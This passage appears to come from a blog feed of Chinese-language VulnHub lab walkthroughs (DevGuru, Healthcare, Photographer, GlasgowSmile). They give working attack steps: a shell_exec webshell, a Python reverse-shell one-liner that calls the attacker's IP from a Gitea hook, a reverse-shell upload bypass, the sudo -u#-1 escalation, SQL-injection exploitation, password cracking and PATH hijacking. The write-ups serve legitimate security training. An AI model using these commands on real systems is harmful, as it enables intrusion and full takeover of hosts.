        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/devguru-1,620/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>靶机地址：192.168.56.101；kali地址：192.168.56.103。用nmap扫描靶机开放端口</p><p><img src="/posts/790d5f77/image-20221201214433853.png"></p><p>开放端口：</p><ul><li><p>22：ssh OpenSSH 7.6p1</p></li><li><p>80：http Apache httpd 2.4.29</p></li><li><p>8585：tcp gitea git项目托管仓库</p></li></ul><p>80端口：一个公司的网页，无发现。</p><p><img src="/posts/790d5f77/image-20221201221652911.png"></p><p>8585端口：git项目仓库。根据nmap扫描结果，编辑&#x2F;etc&#x2F;hosts文件，把靶机的IP地址和域名devguru.local加入文件。</p><p><img src="/posts/790d5f77/image-20221201223932400.png"></p><p>访问用户仓库<a href="http://devguru.local:8585/frank/devguru-website.git%EF%BC%8C">http://devguru.local:8585/frank/devguru-website.git，</a> 因为没有frank权限无法访问项目内容，目前只能访问其主页。</p><p><img src="/posts/790d5f77/image-20221201224555186.png"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>扫描到后台内容管理系统：<a href="http://192.168.56.101/backend%EF%BC%8C">http://192.168.56.101/backend，</a> OctoberCMS，采用Laravel PHP框架。</p><p><img src="/posts/790d5f77/image-20221201215509411.png"></p><h2 id="2-提取git仓库获取账密信息"><a href="#2-提取git仓库获取账密信息" class="headerlink" title="2.提取git仓库获取账密信息"></a>2.提取git仓库获取账密信息</h2><p>在之前nmap扫描的时候，发现了git仓库地址<a href="http://192.168.56.101/.git">http://192.168.56.101:80/.git</a></p><p><img src="/posts/790d5f77/image-20221204131235351.png"></p><p>使用<a href="https://github.com/internetwache/GitTools">GitTools</a>中的gitdumper工具，将”.&#x2F;git”内容dump到kali，存在website文件夹中。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./gitdumper.sh  http://devguru.local/.git website/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/790d5f77/4.png"></p><p>dump完成之后，发现文件不可读，这时要用GitTools中的Extractor工具来还原不完整的仓库内容。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./extractor.sh <span class="token punctuation">..</span>/website ./website<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/790d5f77/image-20221204134049715.png"></p><p>现在可以查看git仓库中的内容了，通过查找提取的文件，发现adminer.php文件。</p><p><img src="/posts/790d5f77/image-20221204134526378.png"></p><p>访问adminer.php，这是一个PHP的mysql数据库登录页。</p><p><img src="/posts/790d5f77/image-20221204134730164.png"></p><p>返回到仓库文件夹，查找到了database.php文件，这可能是数据库相关文件。</p><p><img src="/posts/790d5f77/image-20221204140100642.png"></p><p>查看这个文件，发现了我们感兴趣的信息，还记得目录扫描出了名为October的CMS系统吗？这里很可能就是它的登录用户名和密码。</p><p><img src="/posts/790d5f77/image-20221204140406107.png"></p><p>尝试登录OctoberCMS，然而失败了。看来不是October的账户，而是上一步adminer.php的数据库账户。</p><p><img src="/posts/790d5f77/image-20221204140708582.png"></p><p>尝试登录adminer.php，登录成功！</p><p><img src="/posts/790d5f77/image-20221204140945212.png"></p><p>因为目的是登录CMS，所以首先关注到backend_users表，查看表中内容，发现了账户和密码信息。</p><p><img src="/posts/790d5f77/image-20221204141153799.png"></p><p>密码是经过加密的，用<a href="https://www.tunnelsup.com/hash-analyzer/">HashAnalyzer</a>分析数据库存储密码用的是Bcrypt算法。</p><p><img src="/posts/790d5f77/1qxR7_WrVmQbf_JKjA--yZQ.png"></p><p>我们现在拥有数据库的admin权限，可以修改账户密码，所以将用户密码更改为已知密码的hash。例如“123456”的Bcrypt hash。</p><p><img src="/posts/790d5f77/image-20221204141813005.png"></p><p><img src="/posts/790d5f77/image-20221204141936710.png"></p><p>然后尝试用<strong>frank:123456</strong>登录CMS，登录成功！</p><p><img src="/posts/790d5f77/image-20221204142058587.png"></p><h2 id="3-CMS中植入恶意代码获取webshell"><a href="#3-CMS中植入恶意代码获取webshell" class="headerlink" title="3.CMS中植入恶意代码获取webshell"></a>3.CMS中植入恶意代码获取webshell</h2><p>由于这个CMS只能保存htm文件，所以不能直接上次php反弹shell文件，但是可以通过修改htm文件，设置一个webshell来执行命令。</p><p><img src="/posts/790d5f77/image-20221204143612854.png"></p><p>新建一个shell文件，添加该文件的code：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">onStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">page</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"myVar"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/posts/790d5f77/image-20221204145503260.png"></p><p>在Markup中加入代码调用：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&#123;&#123; this.page.myVar &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/790d5f77/image-20221204145534982.png"></p><p>这时cmd作为webshell的参数，可以接收命令。</p><p><img src="/posts/790d5f77/image-20221204145613176.png"></p><h3 id="webshell下载反弹shell文件"><a href="#webshell下载反弹shell文件" class="headerlink" title="webshell下载反弹shell文件"></a>webshell下载反弹shell文件</h3><p>利用webshell从主机上下载PHP的<a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">反弹shell文件</a>。</p><p>kali上启动python HTTP服务等待靶机下载：</p><p><img src="/posts/790d5f77/image-20221204150754071.png"></p><p>webshell的wget命令下载shell.php文件到靶机。</p><p><img src="/posts/790d5f77/image-20221204151621505.png"></p><p><img src="/posts/790d5f77/image-20221204151658819.png"></p><p>在kali上监听端口等待回连，然后触发shell.php</p><p><img src="/posts/790d5f77/image-20221204151111116.png"></p><p><img src="/posts/790d5f77/image-20221204151935666.png"></p><p>反弹shell成功！此时是www-data用户权限。</p><p><img src="/posts/790d5f77/image-20221204151833373.png"></p><h2 id="4-提权到frank"><a href="#4-提权到frank" class="headerlink" title="4.提权到frank"></a>4.提权到frank</h2><p>利用python3转为bash终端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看了&#x2F;home文件夹，只有frank一个用户，目前不可访问。看来要先提权到frank用户再提权到root用户。</p><p>继续浏览系统文件，发现了&#x2F;var&#x2F;backups文件夹，这种备份文件要引起注意。</p><p>查看其中的app.ini.bak文件，正是靶机使用的gitea应用的配置文件。其中，又发现了数据库信息。</p><p><img src="/posts/790d5f77/image-20221204155157250.png"></p><p>转到<a href="http://192.168.56.101/adminer.php%EF%BC%8C">http://192.168.56.101/adminer.php，</a> 登录！</p><p><img src="/posts/790d5f77/image-20221204155404626.png"></p><p><img src="/posts/790d5f77/image-20221204155445992.png"></p><p>查看user表，显示frank用户的密码和hash算法</p><p><img src="/posts/790d5f77/image-20221204155821899.png"></p><p>与上文同样的原理，将密码替换成已知的密码。</p><p><img src="/posts/790d5f77/image-20221204160432755.png"></p><p>现在登录8585端口的gitea应用</p><p><img src="/posts/790d5f77/image-20221204160548164.png"></p><p>登录成功，现在可以查看frank的仓库页面了。</p><p><img src="/posts/790d5f77/image-20221204160638563.png"></p><p> 因为这是frank权限的文件，所以如果在这里得到反弹shell，那么获取的应该是frank权限。</p><p>进入到项目的Setting页，点击 <strong>Git Hooks &gt; pre-receive &gt; Hook Content</strong>，添加python反弹shell代码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.103",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/790d5f77/image-20221204163541258.png"></p><p>但是要触发反弹shell代码，需要更新仓库，在点击提交的时候触发代码执行。</p><p>返回仓库页面，编辑README.md文件，随便在结尾添加几个空格，然后点击提交。</p><p><img src="/posts/790d5f77/image-20221204163919124.png"></p><p><img src="/posts/790d5f77/image-20221204163949564.png"></p><p>这时可以看到反弹shell成功！</p><p><img src="/posts/790d5f77/image-20221204164058080.png"></p><p>此时账户为frank权限。还需要继续提权到root。</p><p><img src="/posts/790d5f77/image-20221204164219253.png"></p><p>得到frank用户的flag。</p><p><img src="/posts/790d5f77/image-20221204164309349.png"></p><h2 id="5-提权到root"><a href="#5-提权到root" class="headerlink" title="5.提权到root"></a>5.提权到root</h2><p>查看frank用户可以用root权限执行sqlite3，而sudo版本为1.8.21,这个版本的sudo是<a href="https://www.exploit-db.com/exploits/47502">有漏洞的</a>。</p><p><img src="/posts/790d5f77/image-20221204164848083.png"></p><p><a href="https://www.exploit-db.com/exploits/47502">exploit</a>中的提权方法：</p><p><img src="/posts/790d5f77/image-20221204165205203.png"></p><p>但是我们的程序不是&#x2F;bin&#x2F;bash，而是sqlite3，查阅<a href="https://sqlite.org/cli.html#special_commands_to_sqlite3_dot_commands_">sqlite3的特殊命令</a></p><p><img src="/posts/790d5f77/image-20221204170231812.png"></p><p>因此用以下代码提权：</p><pre class="line-numbers language-none"><code class="language-none">sudo -u#-1 sqlite3 &#x2F;dev&#x2F;null &#39;.shell &#x2F;bin&#x2F;bash&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/790d5f77/image-20221204170356631.png"></p><p>获取到root用户的flag</p><p><img src="/posts/790d5f77/image-20221204170524493.png"></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>这个靶机对我来说难度比较大，总结一下考察的知识点有：</p><ul><li>GitTools的使用</li><li>数据库的知识</li><li>寻找可疑文件的能力</li><li>熟悉cms和git的反弹shell利用（webshell，php reverse shell，python reverse shell）</li><li>sudo版本脆弱性提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Healthcare：用big字典扫描隐藏目录</title>
      <link href="/posts/8c926676.html"/>
      <url>/posts/8c926676.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h2><p><img src="/posts/8c926676/image-20221202094737313.png"></p><p>nmap扫出了它的robots.txt，但是它里面的这些目录都不可访问。发现了一个疑似用户名oden，不知有没有用，先记录：</p><p><img src="/posts/8c926676/image-20221202095052236.png"></p><h2 id="2-Web服务枚举"><a href="#2-Web服务枚举" class="headerlink" title="2.Web服务枚举"></a>2.Web服务枚举</h2><p>80端口主页，有一个输入邮箱的地方，测试做了特殊字符过滤，没测出什么。</p><p><img src="/posts/8c926676/image-20221202095251275.png"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>用一般的字典没扫出其它东西，用 SecList的big字典扫描才扫出了敏感目录。以后有扫不出来的情况记得试一试这个。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://10.0.2.103 <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/8c926676/image-20221201173212613.png"></p><p>扫出目录：<a href="http://10.0.2.103/openemr/">http://10.0.2.103/openemr/</a></p><p><img src="/posts/8c926676/image-20221202093923266.png"></p><h3 id="利用OpenEMR-SQL注入漏洞"><a href="#利用OpenEMR-SQL注入漏洞" class="headerlink" title="利用OpenEMR SQL注入漏洞"></a>利用OpenEMR SQL注入漏洞</h3><p>该目录为<strong>OpenEMR v4.1.0</strong>的登录页，搜索该应用的exploit</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit openemr <span class="token number">4.1</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/8c926676/image-20221205143200744.png"></p><p>从搜索结果来看，该版本存在sql注入漏洞，按照exploit中的注入点试一下，确实存在漏洞。</p><p><img src="/posts/8c926676/image-20221205143426075.png"></p><p>而且根据错误提示来看，可以得到用户名和密码。</p><p>把&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;49742.py文件拷贝到当前工作目录，编辑py文件修改ip地址。</p><p><img src="/posts/8c926676/image-20221205144050503.png"></p><p>执行exploit，得到账密信息</p><p><img src="/posts/8c926676/image-20221205145655624.png"></p><p>将结果复制进hash.txt，然后用Johnny工具破解密码：</p><p><img src="/posts/8c926676/image-20221205152658003.png"></p><p>破解出密码为：</p><ul><li>admin:ackbar</li><li>medical:medical</li></ul><p><img src="/posts/8c926676/image-20221205152802859.png"></p><h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h2><p>用admin账户登录OpenEMR系统。</p><p><img src="/posts/8c926676/image-20221205153036024.png"></p><p>找到一处可以上传文件的地方</p><p><img src="/posts/8c926676/image-20221205155427926.png"></p><p>上传shell.php，这里没有做过滤，文件上传成功。接下来在kali监听端口，然后访问url触发。</p><p><img src="/posts/8c926676/image-20221205155717996.png"></p><p><img src="/posts/8c926676/image-20221205155737106.png"></p><p>反弹连接成功！</p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p><img src="/posts/8c926676/image-20221205160221285.png"></p><p>目前是apache用户。</p><h3 id="提权到medical用户"><a href="#提权到medical用户" class="headerlink" title="提权到medical用户"></a>提权到medical用户</h3><p>进入&#x2F;home文件夹，发现了medical用户，还记得密码破解时破解出了medical用户的密码为medical，所以用这个密码切换到medical用户，成功！</p><p><img src="/posts/8c926676/image-20221205160601848.png"></p><p>用以下命令转换到&#x2F;bin&#x2F;bash（这个靶机里如果用python3会提示不存在，用python可以）。</p><pre class="line-numbers language-none"><code class="language-none">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="提权到almirant用户"><a href="#提权到almirant用户" class="headerlink" title="提权到almirant用户"></a>提权到almirant用户</h3><p>经过一番查找，在&#x2F;var&#x2F;backups目录中找到了shadow文件，查看shadow文件，发现了&#x2F;home文件夹中存在的用户almirant密码。</p><p><img src="/posts/8c926676/image-20221205162311039.png"></p><p>靶机里如果出现除了root的其它用户，一般都是需要提权到该用户的，所以现在得到了shadow文件，尝试用john破解密码。</p><p><img src="/posts/8c926676/image-20221205162652394.png"></p><p>破解密码为skywalker，切换到almirant用户。</p><p><img src="/posts/8c926676/image-20221205162814123.png"></p><p>在almirant用户的主文件夹中获取到user.txt</p><p><img src="/posts/8c926676/image-20221205162959785.png"></p><h3 id="提权到root用户"><a href="#提权到root用户" class="headerlink" title="提权到root用户"></a>提权到root用户</h3><p>用以下命令查找suid权限文件</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可疑文件healthcheck</p><p><img src="/posts/8c926676/image-20221205163819898.png"></p><p>这是一个靶机作者自己写的程序，就不像其他已知程序一样可以查阅suid获取root权限的命令，所以要先看一下这个程序是干嘛的。</p><p>运行程序发现它显示的是做系统健康检测，打印出网卡信息和磁盘信息等。用strings命令查看程序中包含的字符串：</p><p><img src="/posts/8c926676/image-20221205173421168.png"></p><p>这里可以看到程序执行了ifconfig打印网卡信息，但是它没有使用绝对路径，那么就可以创建一个假的”ifconfig“程序并更改环境变量，进行目录劫持。</p><p>在almirant用户目录下，依次执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ifconfigchmod +x ifconfigexport PATH&#x3D;&#x2F;home&#x2F;almirant:$PATH&#x2F;usr&#x2F;bin&#x2F;healthcheck <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/posts/8c926676/image-20221205174354169.png"></p><p>程序执行后，提权到root成功！</p><p><img src="/posts/8c926676/image-20221205174622919.png"></p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>该靶机主要考察以下知识点：</p><ul><li>用“大字典”深度扫描目录；</li><li>已知漏洞exploit的利用；</li><li>密码破解工具；</li><li>suid权限文件，劫持环境变量提权。</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Photographer：利用sambashare获取账密信息</title>
      <link href="/posts/d117200a.html"/>
      <url>/posts/d117200a.html</url>
      
        <content type="html"><![CDATA[<p>靶机下载地址：<a href="https://www.vulnhub.com/entry/photographer-1,519/">https://www.vulnhub.com/entry/photographer-1,519/</a></p><p>这个靶机只能在virtualbox中打开，而kali是vmware的，因此需要一些网络配置才能使二者互通：<a href="https://blog.csdn.net/qq_43342566/article/details/102679837?spm=1001.2101.3001.6650.3">配置方法</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>地址信息</p><p>靶机地址：10.0.2.100</p><p>kali地址：10.0.2.102</p><p>nmap扫描开放端口和服务：</p><pre class="line-numbers language-none"><code class="language-none">nmap -A -sV 10.0.2.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130100955815.png"></p><p>开放端口信息</p><ul><li>80：http webserver  Apache httpd 2.4.18 (Ubuntu)</li><li>139 ：netbios-ssn Samba smbd 3.X - 4.X</li><li>445：netbios-ssn Samba smbd 4.3.11-Ubuntu</li><li>8000 ：http webserver Koken CMS</li></ul><p>测试思路</p><ul><li>80和8000端口：功能点测试、审查源码、JS文件、目录扫描</li><li>139和455端口：SMB协议枚举，利用已知漏洞</li></ul><h2 id="2-Web应用枚举"><a href="#2-Web应用枚举" class="headerlink" title="2.Web应用枚举"></a>2.Web应用枚举</h2><p>80端口：一个漂亮的网页，查看源码无发现。</p><p><img src="/posts/d117200a/image-20221129155203914.png"></p><p>8000端口：这是一个由名为koken的内容管理系统（CMS）搭建的。</p><p><img src="/posts/d117200a/image-20221129155230114.png"></p><p>通过目录扫描，发现了管理员登录界面。</p><p><img src="/posts/d117200a/image-20221129160601357.png"></p><h2 id="3-SMB协议枚举"><a href="#3-SMB协议枚举" class="headerlink" title="3.SMB协议枚举"></a>3.SMB协议枚举</h2><p>从端口扫描可以看到靶机系统为ubuntu，139和445端口利用samba实现在linux系统上的SMB协议。</p><p>使用<a href="https://www.kali.org/tools/enum4linux/">enum4linux</a>工具对目标Linux系统进行枚举.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">enum4linux <span class="token number">10.0</span>.2.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130105543201.png"></p><p>扫描结果显示“sambashare”共享可用，可以作为切入点。</p><p>继续查看enum4linux的输出，发现两个用户：daisa和agi。</p><p><img src="/posts/d117200a/image-20221130110250610.png"></p><p>尝试连接sambashare，先匿名登录，如果不行可能会用到上面两个用户名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token parameter variable">-U</span> <span class="token string">''</span> //10.0.2.100/sambashare<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sambashare在无用户名和密码的情况下成功连接：</p><p><img src="/posts/d117200a/image-20221130110641601.png"></p><p>查看文件，里面有两个文件：一个txt文件，另一个似乎是wordpress的备份文件。</p><p>先查看txt文件看能否获取信息，再考虑比较复杂的wordpress文件。</p><p><img src="/posts/d117200a/image-20221130111204807.png"></p><p>txt文件内容貌似是一封信：</p><p><img src="/posts/d117200a/image-20221130111257519.png"></p><p>从信里的信息可以猜测，<strong>邮箱：<a href="mailto:&#100;&#x61;&#105;&#x73;&#97;&#64;&#112;&#x68;&#x6f;&#x74;&#111;&#x67;&#114;&#x61;&#112;&#104;&#x65;&#x72;&#x2e;&#x63;&#111;&#109;">&#100;&#x61;&#105;&#x73;&#97;&#64;&#112;&#x68;&#x6f;&#x74;&#111;&#x67;&#114;&#x61;&#112;&#104;&#x65;&#x72;&#x2e;&#x63;&#111;&#109;</a>，密码：babygirl</strong></p><p>用这个账密信息尝试登录koken管理员界面:<a href="http://10.0.2.100:8000/admin">http://10.0.2.100:8000/admin</a></p><p><img src="/posts/d117200a/image-20221130111757995.png" alt="登录成功"></p><h2 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h2><p>现在可以以管理员身份登录Koken CMS系统，搜一下这个系统的漏洞。</p><p>存在一个<a href="https://www.exploit-db.com/exploits/48706">任意文件上传漏洞</a> ，漏洞描述：Koken CMS的上传限制基于允许的文件扩展名列表(withelist)，这有助于通过Burp处理HTTP请求来进行绕过。</p><p>利用步骤：</p><p>1）创建恶意PHP文件，这里使用的是kali系统目录 &#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php下的php反弹shell文件，把ip地址和端口分别修改为kali的ip和监听端口。</p><p><img src="/posts/d117200a/image-20221130140749360.png"></p><p>2）保存为 “image.php.jpg”.</p><p>3）登录Koken系统，在首页Library标签中点击“Import Content”按钮上传文件，并用burp拦截。</p><p><img src="/posts/d117200a/image-20221130141431892.png"></p><p><img src="/posts/d117200a/image-20221130141624609.png" alt="burp拦截"></p><p>4）在burp中修改文件名为“image.php”再重放。</p><p><img src="/posts/d117200a/image-20221130144449082.png" alt="标记的两处都要改"></p><p>5）在content页面，查看已经上传的php文件。</p><p><img src="/posts/d117200a/image-20221130144838277.png"></p><p>6）在kali中监听端口，触发文件链接，反弹shell成功！</p><p><img src="/posts/d117200a/image-20221130145035971.png"></p><p>查看当前权限，为www-data站点用户，进入&#x2F;home&#x2F;daisa目录，user.txt任何用户可查看，得到普通用户user.txt</p><p><img src="/posts/d117200a/image-20221130145605649.png"></p><h2 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h2><p>检查是否存在<strong>suid权限文件</strong>，suid权限的作用是允许用户以其所有者的权限执行文件，因此如果有可以让普通用户执行的属于root的文件，即可获取root权限。</p><p>用以下命令查找suid权限文件:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130150718574.png"></p><p>发现php7.2有suid权限，查找<a href="https://gtfobins.github.io/gtfobins/php/">GTFO Bins</a>，用以下命令提权。</p><p><img src="/posts/d117200a/image-20221130151011473.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/php7.2 <span class="token parameter variable">-r</span> <span class="token string">"pcntl_exec('/bin/bash', ['-p']);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功获取root权限！</p><p><img src="/posts/d117200a/image-20221130151442420.png"></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>靶机考察的知识点：</p><ul><li>公开的samba共享泄露账密等信息；</li><li>利用CMS系统任意文件上传漏洞反弹shell；</li><li>利用suid权限文件提权。</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GlasgowSmile：定制字典生成爆破与提权的多种姿势</title>
      <link href="/posts/3bd3766a.html"/>
      <url>/posts/3bd3766a.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/glasgow-smile-11,491/">靶机链接</a></p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>扫描存在主机，靶机ip：192.168.71.134</p><p><img src="/posts/3bd3766a/image-20221117223719161.png"></p><p>扫描开放端口</p><p><img src="/posts/3bd3766a/image-20221117224430723.png"></p><p>开放端口及服务版本：</p><ul><li>22&#x2F;tcp OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</li><li>80&#x2F;tcp Apache httpd 2.4.38 ((Debian))</li></ul><p>80端口：一张图片joker.jpg。</p><p><img src="/posts/3bd3766a/image-20221117224553420.png"></p><p>开始进行目录扫描。</p><pre class="line-numbers language-none"><code class="language-none">dirb http:&#x2F;&#x2F;192.168.71.134 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫出的目录很多，重点是一名为joomla的目录。貌似是一个博客页面，google了下发现是一个内容管理系统（CMS）。</p><p>审查了源码没发现特别。</p><p><img src="/posts/3bd3766a/image-20221117230857617.png" alt="joomla"></p><p>扫描到了一个登录页面，看了下Joomla没有默认账密，所以可能需要爆破或其他途径获取账密。</p><p><img src="/posts/3bd3766a/image-20221117231507377.png" alt="administrator"></p><p>搜索Joomla系统的已知漏洞，测试poc：<a href="https://www.exploit-db.com/exploits/47465">https://www.exploit-db.com/exploits/47465</a></p><p><img src="/posts/3bd3766a/image-20221117234904447.png"></p><p>不能利用。</p><h2 id="2-cewl生成字典"><a href="#2-cewl生成字典" class="headerlink" title="2.cewl生成字典"></a>2.cewl生成字典</h2><p>尝试爆破joomla的登录界面。在joomla首页里全是小丑电影相关的台词，猜测站主可能会利用这些台词作为密码。于是利用 <a href="https://www.kali.org/tools/cewl/">cewl</a> 工具以主页内容生成密码字典。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl http://192.168.71.134/joomla <span class="token parameter variable">-m</span> <span class="token number">5</span> <span class="token parameter variable">-d</span> <span class="token number">1</span> <span class="token parameter variable">-w</span> joker.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bd3766a/image-20221129210020094.png"></p><p>新建users.txt，作为用户名。</p><p><img src="/posts/3bd3766a/image-20221129210100551.png"></p><h2 id="3-Joomla密码爆破"><a href="#3-Joomla密码爆破" class="headerlink" title="3.Joomla密码爆破"></a>3.Joomla密码爆破</h2><p>利用nmap的NSE脚本爆破joomla。首先查找joomla相关脚本，找到了http-joomla-brute.nse。</p><p><img src="/posts/3bd3766a/image-20221129212447122.png"></p><p>修改脚本，更改脚本中的默认登录URI：</p><p><img src="/posts/3bd3766a/image-20221129212957914.png"></p><p>利用刚才生成的密码字典开始爆破：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span> http-joomla-brute --script-args <span class="token string">'userdb=users.txt,passdb=joker.txt'</span> <span class="token number">192.168</span>.71.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bd3766a/image-20221129213354809.png"></p><p>爆破出了三个账号，后两个经验证是错的，可能是换行符的原因，但是joomla用户可以登录。</p><p>用<strong>账密joomla:Gotham</strong>登录joomla后台。</p><p><img src="/posts/3bd3766a/image-20221129215145303.png"></p><h2 id="4-PHP反弹shell"><a href="#4-PHP反弹shell" class="headerlink" title="4.PHP反弹shell"></a>4.PHP反弹shell</h2><p>进入系统后，编辑Beez3模板中的index.php，替换为<a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP 反弹shell</a> ，把相应的反弹地址和端口改为kali的ip地址和监听端口并保存。</p><p><img src="/posts/3bd3766a/image-20221130003031536.png" alt="进入Beez3模板页面"></p><p><img src="/posts/3bd3766a/image-20221129220840828.png" alt="修改模板的index.php"></p><p>在kali中用ncat监听4000端口，并点击预览更改后的index.php</p><p><img src="/posts/3bd3766a/image-20221129221543141.png" alt="点击标黄色的按钮触发"></p><p>shell反弹成功！</p><p><img src="/posts/3bd3766a/image-20221129221913736.png"></p><p>利用python3转为bash终端：</p><pre class="line-numbers language-none"><code class="language-none">python3 -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-权限提升"><a href="#5-权限提升" class="headerlink" title="5.权限提升"></a>5.权限提升</h2><p>查看当前用户权限，目前为www-data，是网络站点用户。</p><p><img src="/posts/3bd3766a/image-20221129223057288.png"></p><p>去&#x2F;home目录下看到有三个用户：</p><p><img src="/posts/3bd3766a/image-20221129223203328.png"></p><h3 id="提权至rob用户"><a href="#提权至rob用户" class="headerlink" 